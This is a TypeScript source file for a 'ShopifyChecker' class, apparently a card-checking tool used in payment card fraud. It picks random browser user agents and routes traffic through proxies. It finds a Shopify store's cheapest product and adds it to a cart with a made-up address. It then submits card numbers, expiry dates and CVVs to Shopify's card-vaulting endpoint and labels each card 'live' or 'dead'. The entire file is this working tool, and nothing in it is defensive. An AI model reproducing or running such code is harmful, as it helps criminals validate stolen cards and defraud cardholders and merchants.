import axios, { type AxiosInstance } from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';

// Hardcoded User Agents
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

// Types
export interface CardData {
  cc: string;
  month: string;
  year: string;
  cvv: string;
}

export interface ProxyConfig {
  url: string; // http://user:pass@host:port
}

export interface CheckResult {
  status: 'live' | 'dead' | 'unknown';
  message: string;
}

export class ShopifyChecker {
  private client: AxiosInstance;
  private proxy?: ProxyConfig;
  private userAgent: string;

  constructor(proxy?: ProxyConfig) {
    this.proxy = proxy;
    this.userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];

    // Create axios instance with proxy if provided
    const config: any = {
      timeout: 30000,
      validateStatus: () => true,
      headers: {
        'User-Agent': this.userAgent,
        'Accept': 'application/json',
      }
    };

    if (proxy) {
      const agent = new HttpsProxyAgent(proxy.url);
      config.httpAgent = agent;
      config.httpsAgent = agent;
      config.proxy = false;
    }

    this.client = axios.create(config);
  }

  private findBetween(content: string, start: string, end: string): string {
    const startIndex = content.indexOf(start);
    if (startIndex === -1) return '';
    const actualStart = startIndex + start.length;
    const endIndex = content.indexOf(end, actualStart);
    if (endIndex === -1) return '';
    return content.substring(actualStart, endIndex);
  }

  // Step 0: Find cheap product
  async findCheapProduct(siteUrl: string): Promise<{ id: string, price: string, title: string }> {
    try {
        const productsUrl = `${siteUrl.replace(/\/$/, '')}/products.json`;
        const response = await this.client.get(productsUrl);
        
        if (response.status !== 200) throw new Error(`HTTP ${response.status}`);

        const data = response.data;
        if (!data || !data.products) throw new Error('Invalid JSON or not a Shopify store');

        let minPrice: number | null = null;
        let bestVariant: any = null;
        let productTitle = '';

        for (const product of data.products) {
            for (const variant of product.variants) {
                const price = parseFloat(variant.price);
                if (price >= 0.01 && variant.available !== false) {
                    if (minPrice === null || price < minPrice) {
                        minPrice = price;
                        bestVariant = variant;
                        productTitle = product.title;
                    }
                }
            }
        }

        if (!bestVariant) throw new Error('No available products found');

        return {
            id: bestVariant.id,
            price: bestVariant.price,
            title: productTitle
        };
    } catch (e: any) {
        throw new Error(`${e.message}`);
    }
  }

  // Address details based on country
  private getAddress(countryCode: string) {
     if (countryCode === 'AU') {
        return {
            address1: "134 Buckhurst Street",
            city: "South Melbourne",
            province: "VIC",
            zip: "3205",
            country: "Australia",
            province_code: "VIC",
            country_code: "AU",
            phone: "07 3803 6136"
        };
     }
     return {
        address1: "420 Park ave",
        city: "New York",
        province: "NY",
        zip: "10016",
        country: "United States",
        province_code: "NY",
        country_code: "US",
        phone: "(879) 658-2525"
    };
  }

  async checkCard(siteUrl: string, product: { id: string }, card: CardData): Promise<CheckResult> {
    const baseUrl = siteUrl.replace(/\/$/, '');
    const cartUrl = `${baseUrl}/cart/${product.id}:1`;

    try {
        // === Step 1: Initial Session (Add to cart) ===
        const headers1 = {
            'User-Agent': this.userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Upgrade-Insecure-Requests': '1',
        };
        const res1 = await this.client.get(cartUrl, { 
            headers: headers1,
            maxRedirects: 5 
        });
        
        // Check for captcha
        if (typeof res1.data === 'string' && res1.data.includes('recaptcha')) {
            return { status: 'dead', message: 'Captcha detected' };
        }

        // === Step 2: Card Tokenization (Shopify Payment Vault) ===
        // This verifies the card format is valid and gets a payment session token
        const depositUrl = "https://deposit.shopifycs.com/sessions";
        const depositPayload = {
            credit_card: {
                number: card.cc,
                month: parseInt(card.month),
                year: parseInt(card.year.length === 2 ? `20${card.year}` : card.year),
                verification_value: card.cvv,
                name: "Test User"
            },
            payment_session_scope: new URL(baseUrl).hostname
        };
        
        const res2 = await this.client.post(depositUrl, depositPayload, {
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': 'https://checkout.shopifycs.com',
                'Referer': 'https://checkout.shopifycs.com/'
            }
        });
        
        // Check response
        if (res2.status === 200 && res2.data && res2.data.id) {
            // Card was successfully tokenized - format is valid
            return { status: 'live', message: `Tokenized: ${res2.data.id.substring(0, 20)}...` };
        } else if (res2.data && res2.data.errors) {
            // Tokenization failed with specific error
            const errorMsg = Array.isArray(res2.data.errors) 
                ? res2.data.errors.join(', ')
                : JSON.stringify(res2.data.errors);
            return { status: 'dead', message: `Declined: ${errorMsg}` };
        } else {
            return { status: 'unknown', message: `Unexpected response: ${res2.status}` };
        }

    } catch (e: any) {
        return { status: 'dead', message: e.message || 'Unknown error' };
    }
  }
}
